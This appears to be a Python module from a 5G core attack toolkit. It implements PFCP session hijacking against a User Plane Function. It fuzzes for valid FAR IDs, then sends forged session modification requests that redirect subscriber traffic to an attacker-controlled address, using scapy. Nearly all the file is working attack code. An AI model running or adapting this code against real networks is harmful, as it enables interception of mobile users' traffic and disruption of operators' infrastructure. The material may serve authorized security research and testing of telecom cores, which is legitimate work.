from src.utils.protocols.pfcp import PFCPToolkit
import random, time, threading, ipaddress
from scapy.all import send, sr1

from scapy.contrib.pfcp import *

from src.pfcpToolkit.utils.logger import Log
from src.pfcpToolkit.utils.handleParams import HandleParams


from src.attacks.pfcp.pfcpFuzzer import PFCPFuzzer


class PFCPHijack:
    def __init__(self, verbose=False, hijacker_addr=None, upf_addr=None, src_port=None, dest_port=None,):
        self.hijacker_addr = hijacker_addr
        self.upf_addr = upf_addr
        self.src_port = src_port
        self.dest_port = dest_port

        self.class_prefix = "[PFCP-HIJACK]"
        self.paramsHandler = HandleParams(self.class_prefix)
        self.logger = Log(self.class_prefix)
        self.verbose = verbose

    def start_PFCP_hijack_far_manipulation( self, hijacker_addr, upf_addr, seid, src_port=8805, dest_port=8805, verbose=True,):
        """
        Start PFCP hijack far manipulation
        """

        self.paramsHandler.check_parameters(
            {
                "hijacker_addr": hijacker_addr,
                "upf_addr": upf_addr,
                "src_port": src_port,
                "dest_port": dest_port,
            },
            "[Start_PFCP_hijack_far_manipulation]",
        )

        PFCPToolkit_obj = PFCPToolkit(
            src_addr=hijacker_addr,
            dest_addr=upf_addr,
            src_port=src_port,
            dest_port=dest_port,
            verbose=verbose,
        )

        PFCPFuzzer_obj = PFCPFuzzer()

        valid_farids = PFCPFuzzer_obj.start_PFCP_FARID_fuzzing(
            upf_addr=upf_addr,
            src_addr=hijacker_addr,
            max_seid=seid,
            max_far_discover=100,
            src_port=src_port,
            dest_port=dest_port,
            seid=seid,
        )

        teid = random.randint(1, 100000)
        for seid, farid_list in valid_farids.items():
            self.logger.info(f"Valid FAR IDs for SEID {seid}:")
            for farid in farid_list:
                self.logger.info(f"Valid FAR ID: {farid}")
                packet = PFCPToolkit_obj.Build_PFCP_session_modification_req(
                    seid=seid, far_id=farid, tdest_addr=hijacker_addr, teid=teid
                )
                send(packet)

        # for far_id in valid_farids:
        #     # Create a PFCP session modification request
        #     packet = PFCPToolkit_obj.Build_PFCP_session_modification_req(seid=seid, far_id=far_id)

        #     # Send the packet
        #     self.logger.info(f"Sending PFCP session modification request with SEID {seid} and FAR ID {far_id}")

        #     # Send the packet
        #     send(packet)

        #     # Wait for a response
        #     response = sr1(packet)

        #     if response:
        #         self.logger.success(f"Received response: {response.summary()}")
        #     else:
        #         self.logger.error("No response received")

        # PFCPToolkit_obj.Send_PFCP_session_modification_req()

        # # Send the packet
        # send(packet)
